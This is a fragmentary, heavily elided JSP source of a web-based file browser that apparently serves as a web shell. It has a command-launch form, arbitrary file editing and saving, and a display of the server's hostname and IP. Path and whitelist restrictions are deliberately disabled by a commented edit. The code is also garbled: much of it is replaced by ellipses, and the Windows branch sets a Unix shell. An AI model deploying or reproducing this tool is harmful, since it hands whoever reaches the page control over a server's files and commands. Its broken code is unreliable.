...
%><%
    ...
    if (url==null || "".equals(url)) {
        ...
        url_utf8 = url + "?charset=UTF-8";
        url_gbk = url + "?charset=GBK";
    } else {
        url = request.getRequestURI() + "?" + url;
        url_utf8 = url.replaceFirst("(\\?|&)charset=[^&]*","$1charset=UTF-8");
        url_gbk  = url.replaceFirst("(\\?|&)charset=[^&]*","$1charset=GBK");
    }
%><%!
    //FEATURES
    ...
    private static final boolean RESTRICT_BROWSING = false;	//edit by jeffsang
    ...
    private static final boolean RESTRICT_WHITELIST = false; //edit by jeffsang
    ...
    private static final String RESTRICT_PATH = "C:\\;D:\\;E:\\;F:\\;";
    ...
    //private static final String localjsp = "GA_Browser.jsp";
    ...
    static {
        ...
        if (os.startsWith("windows")) {
            ...
            COMMAND_INTERPRETER = new String[]{"/bin/sh","-c"};
        }
...
%><%
    ...
    browser_name=browser_name+"?charset="+charset;
    ...
    <h2><%=LAUNCH_COMMAND %></h2><br />
        <%
				out.println("<form action=\"" + browser_name + "\" method=\"Post\">\n"
						...
						+ "\" rows=\"" + EDITFIELD_ROWS + "\" readonly class=\"memo\">");
				String ret = "";
...
<body>
<center>
    <div style="position:absolute; right:24px;">[<a <%="UTF-8".equals(charset)?"":"href=\""+url_utf8+"\""%> class="v">UTF8경</a>] [<a <%="GBK".equals(charset)?"":"href=\""+url_gbk+"\""%> class="v">GBK경</a>]</div>
    <h3>Edit <%=conv2Html(request.getParameter("editfile"))%></h3>
        <%
                BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(ef), charset));
                boolean dos = false;
                boolean cr = false;
                try {
                  String disable = "";
                  if (!ef.canWrite()) disable = " readonly";
                  out.println("<form action=\"" + url.replaceFirst("editfile=","dir=") + "\" method=\"post\">\n"
                          + "<textarea name=\"text\" wrap=\"off\" cols=\"" + EDITFIELD_COLS
                          + "\" rows=\"" + EDITFIELD_ROWS + "\"" + disable + " class=\"memo\">");
                  String c;
...
%>
    ...
    <table class="formular">
        ...
        <tr><td title="Enter the new filename"><input type="text" name="new_name" value="<%=ef.getName()%>">
            ...
            <form action="<%=url.replaceFirst("editfile=","dir=")%>" method="Post">
                <td align="left">
    ...
    // Save or cancel the edited file
        ...
        if (request.getParameter("Submit").equals("Save")) {
            ...
            if (new_f.exists() && !new_f.canWrite()) request.setAttribute("error",
                ...
                BufferedWriter outs = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new_f), charset));
...
<form class="formular" action="<%= browser_name %>" method="Post" name="FileList">
    ...
    hostname:<input readonly="readonly" name="hostname" style="color: red;background-color: #EEEDE0" value="<%=hostName+"::"+hostIp%>" type="text">
    <div style="position:absolute; right:24px;">
        [<a <%="UTF-8".equals(charset)?"":"href=\""+url_utf8+"\""%> class="v">UTF8경</a>] [<a <%="GBK".equals(charset)?"":"href=\""+url_gbk+"\""%> class="v">GBK경</a>]
    </div>
    <br /><br />
    <table id="filetable" class="filelist" cellspacing="1px" cellpadding="0px">
        <%
            ...
            String cmd = browser_name + (browser_name.lastIndexOf("?")>0?"&":"?") + "dir=" + dir;
            int sortMode = 1;
